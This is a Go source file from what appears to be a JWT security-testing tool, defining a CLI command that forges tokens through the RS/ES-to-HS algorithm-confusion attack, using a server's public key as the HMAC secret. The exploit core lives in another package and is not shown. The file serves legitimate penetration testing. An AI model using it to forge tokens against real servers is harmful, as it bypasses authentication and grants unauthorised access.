package cmd

import (
	"fmt"

	"github.com/cerberauth/jwtop/jwt/exploit"
	"github.com/cerberauth/x/telemetryx"
	"github.com/spf13/cobra"
	"go.opentelemetry.io/otel/attribute"
	"go.opentelemetry.io/otel/metric"
)

var exploitHMACConfusionKey string

var exploitHMACConfusionCmd = &cobra.Command{
	Use:   "hmacconfusion <token>",
	Short: "Re-sign using a public key as HMAC secret (RS/ES → HS)",
	Long: `Re-sign an RSA or ECDSA token as its HMAC equivalent, using the server's
public key PEM as the HMAC secret. This exploits servers that accept HS256
tokens verified with their RSA/EC public key.

Algorithm mapping (same bit-strength):
  RS256 / ES256 / PS256 → HS256
  RS384 / ES384 / PS384 → HS384
  RS512 / ES512 / PS512 → HS512`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		telemetryMeter := telemetryx.GetMeterProvider().Meter(exploitOtelName)
		successCounter, _ := telemetryMeter.Int64Counter("exploit.hmacconfusion.success.counter")
		errorCounter, _ := telemetryMeter.Int64Counter("exploit.hmacconfusion.error.counter")
		ctx := cmd.Context()

		if exploitHMACConfusionKey == "" {
			errorCounter.Add(ctx, 1, metric.WithAttributes(attribute.String("error_reason", "missing key")))
			return fmt.Errorf("--key is required")
		}

		_, pemData, err := resolveKey("", exploitHMACConfusionKey, true)
		if err != nil {
			errorCounter.Add(ctx, 1, metric.WithAttributes(attribute.String("error_reason", "key load failed")))
			return fmt.Errorf("loading public key: %w", err)
		}

		token, err := exploit.HMACConfusion(args[0], pemData)
		if err != nil {
			errorCounter.Add(ctx, 1, metric.WithAttributes(attribute.String("error_reason", "hmacconfusion failed")))
			return fmt.Errorf("hmacconfusion: %w", err)
		}
		successCounter.Add(ctx, 1)
		fmt.Println(token)
		return nil
	},
}

func init() {
	exploitHMACConfusionCmd.Flags().StringVar(&exploitHMACConfusionKey, "key", "", "Path to PEM public key file (required)")
	exploitCmd.AddCommand(exploitHMACConfusionCmd)
}
